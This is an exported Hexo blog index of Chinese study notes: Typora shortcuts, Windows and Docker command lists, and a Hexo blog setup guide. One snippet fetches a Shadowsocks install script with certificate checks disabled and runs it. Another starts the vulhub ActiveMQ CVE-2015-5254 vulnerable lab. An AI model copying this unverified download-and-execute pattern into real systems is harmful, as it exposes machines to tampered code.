<li>跳转到文首： <code>ctrl</code> + <code>Home</code></li>
<li>跳转到文末：<code>ctrl</code> + <code>End</code></li>
<li>跳转到所选内容：<code>ctrl</code> + <code>J</code></li>
<li>查找：ctrl+ F<ul>
<li>查找下一个：<code>F3</code></li>
<li>查找上一个： <code>shift</code> + <code>F3</code></li>
<li>替换： <code>ctrl</code> + <code>H</code></li>
</ul>
</li>
</ul>
<h4 id="段落类"><a href="#段落类" class="headerlink" title="段落类"></a>段落类</h4><ul>
<li>一级标题： <code>ctrl</code> + <code>1</code></li>
<li>二级标题： <code>ctrl</code> + <code>2</code></li>
<li>六级标题： <code>ctrl</code> + <code>6</code></li>
<li>段落： <code>ctrl</code> + <code>0</code></li>
<li>提升标题级别： <code>ctrl</code> + <code>=</code></li>
<li>降低标题级别： <code>ctrl</code> + <code>-</code></li>
<li>表格： <code>ctrl</code> + <code>T</code></li>
<li>代码块： <code>ctrl</code> + <code>shift</code> + <code>K</code></li>
<li>公式块： <code>ctrl</code> + <code>shift</code> + <code>M</code></li>
<li>引用： <code>ctrl</code> + <code>shift</code> + <code>Q</code></li>
<li>有序列表： <code>ctrl</code> + <code>shift</code> + <code>[</code></li>
<li>无序列表： <code>ctrl</code> + <code>shift</code> + <code>]</code></li>
</ul>
<h4 id="格式类"><a href="#格式类" class="headerlink" title="格式类"></a>格式类</h4><ul>
<li>加粗： <code>ctrl</code> + <code>B</code></li>
<li>斜体： <code>ctrl</code> + <code>I</code></li>
<li>下划线： <code>ctrl</code> + <code>U</code></li>
<li>代码： <code>ctrl</code> + <code>shift</code> +   `</li>
<li>删除线： <code>ctrl</code> + <code>shift</code> <code>5</code></li>
<li>超链接：<code>ctrl</code> + <code>K</code></li>
<li>图像： <code>ctrl</code> + <code>shift</code> + <code>I</code></li>
<li>清楚样式： <code>ctrl</code> + <code>\</code></li>
</ul>
<h4 id="视图类"><a href="#视图类" class="headerlink" title="视图类"></a>视图类</h4><ul>
<li>显示/隐藏 侧边栏： <code>ctrl</code> + <code>shift</code> + <code>L</code></li>
<li>大纲视图： <code>ctrl</code> + <code>shift</code> + <code>1</code></li>
<li>文档列表视图： <code>ctrl</code> + <code>shift</code> + 2</li>
<li>搜索： <code>ctrl</code> + <code>shift</code> + <code>F</code></li>
<li>源代码模式： <code>ctrl</code> + <code>/</code></li>
<li>专注模式： <code>F8</code></li>
<li>打字模式： <code>F9</code></li>
<li>切换全屏： <code>F11</code></li>
<li>放大： <code>ctrl</code> + <code>shift</code> + <code>=</code></li>
<li>缩小： <code>ctrl</code> + <code>shift</code> + <code>-</code></li>
<li>应用内窗口切换： <code>ctrl</code> + <code>tab</code></li>
<li>开发者工具： <code>shift</code> + <code>F12</code></li>
</ul>
<p>Xshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>  wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>  chmod +x shadowsocks-all.sh</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>  ./shadowsocks-all.sh <span class="number">2</span>&gt;&amp;<span class="number">1</span> | tee shadowsocks-all.log</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> 选择ShowdowsocksR</span><br></pre></td></tr></table></figure>

<h4 id="windows常用cmd命令"><a href="#windows常用cmd命令" class="headerlink" title="windows常用cmd命令"></a><strong>windows常用cmd命令</strong></h4><p>taskkill /f /t /im  后面再更上应用程序的名字 –关闭程序</p>
<table>
<thead>
<tr>
<th>DEL</th>
<th>删除至少一个文件。</th>
</tr>
</thead>
<tbody><tr>
<td>DIR</td>
<td>显示一个目录中的文件和子目录。</td>
</tr>
<tr>
<td>MD</td>
<td>创建一个目录。</td>
</tr>
<tr>
<td>MKDIR</td>
<td>创建一个目录。</td>
</tr>
<tr>
<td>RD</td>
<td>删除目录。</td>
</tr>
<tr>
<td>TREE</td>
<td>以图形方式显示驱动程序或路径的目录结构。</td>
</tr>
<tr>
<td>type</td>
<td>显示文件内容</td>
</tr>
<tr>
<td>CLS</td>
<td>清除屏幕。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>ipconfig</th>
<th>查看网络配置</th>
</tr>
</thead>
<tbody><tr>
<td>netstat</td>
<td>查看网络状态</td>
</tr>
<tr>
<td>ping</td>
<td>检查与目标主机的连通性</td>
</tr>
<tr>
<td>tracert</td>
<td>查看与目标主机的路由节点</td>
</tr>
<tr>
<td>route print</td>
<td>打印与目标主机的路由</td>
</tr>
<tr>
<td>arp</td>
<td>查看本机的ARP缓存表</td>
</tr>
<tr>
<td>nslookup</td>
<td>查看DNS域名解析记录</td>
</tr>
<tr>
<td>net</td>
<td>网络管理</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux</title>
    <url>/2020/03/06/Linux/</url>
    <content><![CDATA[<hr>
<h2 id="docker常用命令"><a href="#docker常用命令" class="headerlink" title="docker常用命令"></a><strong>docker常用命令</strong></h2><p>1 <strong>docker images</strong> 查看镜像信息列表 镜像是静态的</p>
<p>2 <strong>docker ps -a</strong> 查看运行中的所有容器</p>
<p>3 <strong>docker search [images]:[version]</strong>从dockerhub查询指定镜像</p>
<p>4 <strong>docker pull [images]:[version]</strong>从dockerhub拉取指定镜像</p>
<p>4 <strong>docker run -p 8000:80 -tdi  [imageID]</strong> 后台启动docker,并指定宿主机端口和docker映射端口。</p>
<p> <strong>-i:</strong>以交互模式运行容器，通常与 -t 同时使用；</p>
<p> <strong>-d:</strong>后台运行容器，并返回容器ID；</p>
<p><strong>-t:</strong>为容器重新分配一个伪输入终端，通常与 -i 同时使用；</p>
<p>5 当镜像通过run 启动后，便会载入到一个动态的container(容器)中运行，此时若需要进入终端交互模式：</p>
<p><strong>sudo docker exec -it [containerID] /bin/bash</strong></p>
<p>交互模式中，使用 ctrl+p+q退出交互 保持运行,使用 exit命令退出并停止容器。</p>
<p>6 在容器非交互模式下，通过docker start/stop 命令来启动/停止已部署的容器服务。</p>
<p>7 <strong>docker rm [containerID]</strong> 删除容器</p>
<p>8 <strong>docker rmi [imageID]</strong> 删除镜像</p>
<p>9 <strong>docker cp [YourHostFilePath] [containerID]:[DockerPath]</strong> 将宿主机内的指定文件传输至容器内部的指定地址。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service docker start</span><br><span class="line">cd &#x2F;vulhub&#x2F;activemq&#x2F;CVE-2015-5254</span><br><span class="line">docker-compose up -d  #构建漏洞环境，这个命令包括了docker-compose build</span><br></pre></td></tr></table></figure>

<p>5、环境关闭</p>
<p>docker-compose down</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u root -p root</span><br></pre></td></tr></table></figure>

<p>dpkg -i </p>
]]></content>
      <categories>
        <category>Linux学习</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>简单搭建个属于你的个人博客</title>
    <url>/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<hr>
<p>没想到都大三老狗了，还是个新人的水准，这就是菜吧。但还是要努力学习呀，希望有个好的结果！</p>
<p>废话不多说，开始小白的搭建博客教程吧~</p>
<h4 id="1-安装git"><a href="#1-安装git" class="headerlink" title="1.安装git"></a>1.安装git</h4><p><a href="https://git-scm.com/downloads" target="_blank" rel="noopener">git官网传送门</a></p>
<h4 id="2-安装Node-js"><a href="#2-安装Node-js" class="headerlink" title="2.安装Node.js"></a>2.安装Node.js</h4><p><a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js官网传送门</a></p>
<h4 id="3-安装Hexo"><a href="#3-安装Hexo" class="headerlink" title="3.安装Hexo"></a>3.安装Hexo</h4><p>Hexo拥有丰富的主题，比较推荐</p>
<p>win+R  cmd 输入以下命令，安装hexo包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo</span><br></pre></td></tr></table></figure>

<h4 id="4-建立博客所在文件"><a href="#4-建立博客所在文件" class="headerlink" title="4.建立博客所在文件"></a>4.建立博客所在文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init chj</span><br><span class="line">cd chj</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<p>过程如下图：</p>
<p><img src="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1.png" alt="1234"></p>
<p>文件下的目录如下：</p>
<p><img src="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/cmd.jpg" alt="1234"></p>
<h4 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h4><p>这是网站的配值信息，可以在此配置大部分的参数。</p>
<h4 id="source"><a href="#source" class="headerlink" title="source"></a>source</h4><p>这是存放用户资源的地方，文章会存放在其中的_posts文件夹下，而一些标签、归档则是在source文件夹下。</p>
<h4 id="themes"><a href="#themes" class="headerlink" title="themes"></a>themes</h4><p>主题文件夹，Hexo 会根据主题来生成静态页面，博客所用的各种主题都存放在此目录下。</p>
<h4 id="5-git的基本操作"><a href="#5-git的基本操作" class="headerlink" title="5.git的基本操作"></a>5.git的基本操作</h4><p>安装上诉步骤简单部署好以后，输入以下命令，然后本地localhost:4000访问，就可以看到自己的博客了~</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/4000.png" alt="1234"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name &quot;Your Name&quot;</span><br><span class="line">$ git config --global user.email &quot;email@example.com&quot;</span><br></pre></td></tr></table></figure>

<p>因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。你也许会担心，如果有人故意冒充别人怎么办？这个不必担心，首先我们相信大家都是善良无知的群众，其次，真的有冒充的也是有办法可查的。</p>
<p>注意<code>git config</code>命令的<code>--global</code>参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。</p>
]]></content>
  </entry>
</search>
